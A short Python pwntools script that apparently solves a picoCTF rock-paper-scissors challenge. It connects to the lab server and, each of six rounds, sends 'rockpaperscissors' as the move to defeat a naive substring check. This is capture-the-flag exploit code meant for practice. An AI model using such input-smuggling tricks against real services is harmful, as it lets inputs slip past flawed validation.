#!/usr/bin/env python3

from pwn import *

def conn():
    r = remote("saturn.picoctf.net", 54017)

    return r


def main():
    r = conn()

    for i in range(6): 
        print(r.recvuntil(b'program\r\n'))
        r.sendline(b'1')
        print(r.recvuntil(b'scissors):\r\n'))
        r.sendline(b'rockpaperscissors')

    while True:
        print(r.recvline())

    r.interactive()


if __name__ == "__main__":
    main()
